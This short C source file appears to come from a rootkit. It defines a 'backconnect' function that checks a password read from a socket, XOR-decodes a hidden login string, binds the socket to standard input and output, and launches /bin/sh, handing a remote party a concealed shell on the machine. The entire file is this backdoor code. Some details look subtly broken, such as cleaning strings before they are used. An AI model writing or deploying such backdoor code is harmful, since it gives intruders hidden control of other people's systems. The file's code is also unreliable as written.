#include <stdlib.h> 
#include "../rkconst.h"
void backconnect(int sock)
{ 
	#ifdef DEBUG 
	printf("[!] backconnect called\n"); 
	#endif 

	char tmp[265]; 
	read(sock, tmp, sizeof(tmp));
	char *shellpassword = strdup(SHELLPW);
	if (!strstr(tmp, shellpassword)) 
	{
		CLEAN(shellpassword); 
		close(sock);
		return; 
	}
	write(sock, "[-] backconnect shell dropped\n", strlen("[-] backconnect shell dropped\n")); 
	char *argv[3];
	char *login = strdup(MAGIC); xor(login); 
	char *shell = "/bin/sh"; 
	argv[0] = shell; 
	argv[1] = login; 
	argv[2] = NULL; 
	CLEAN(shell); 
	CLEAN(login); 
	dup2(sock, 0); 
	dup2(sock, 1); 
	dup2(sock, 2); 
	execve(argv[0], argv, NULL); 
	close(sock); 
	return;
}


